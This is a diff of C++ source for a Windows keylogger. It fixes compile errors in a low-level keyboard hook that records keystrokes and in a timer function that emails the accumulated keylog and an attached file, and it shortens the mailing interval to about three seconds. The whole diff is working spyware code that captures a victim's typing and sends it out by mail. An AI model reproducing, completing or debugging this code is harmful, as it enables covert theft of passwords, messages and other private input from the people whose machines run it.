@@ -33,13 +33,13 @@ void TimerSendMail() {
                            "Hi :)\nThe file has been attached to this mail :)\n"
                            "For testing, enjoy:\n" + keylog,
                            IO::GetOurPath(true) + last_file);
-    if( != 7)
+    if( x != 7)
         Helper::WriteAppLog("Mail was not sent! Error code: " + Helper::ToString(x));
     else
         keylog = "";
 }
-// Set the timer to 2 minutes
-Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);
+// Set the timer to 2 minutes = 2000 * 60
+Timer MailTimer(TimerSendMail, 50 * 60, Timer::Infinite);
 
 // Pointer of type hook to our hook
 HHOOK eHook = NULL;
@@ -72,7 +72,7 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {
                 || key == VK_SHIFT
                 || key == VK_RSHIFT
                 || key == VK_LSHIFT
-                || key == MENU
+                || key == VK_MENU
                 || key == VK_LMENU
                 || key == VK_LMENU
                 || key == VK_RMENU
@@ -82,7 +82,7 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {
                 || key == VK_RWIN) {
             // Body of the if-statement
             // Translation work here
-            std::string KeyName = Keys::KEYS[bks->vkCode].Name;
+            std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
             KeyName.insert(1, "/"); // insert the backslash for a HOLD-ing key (pressed)
             keylog += KeyName;
         }
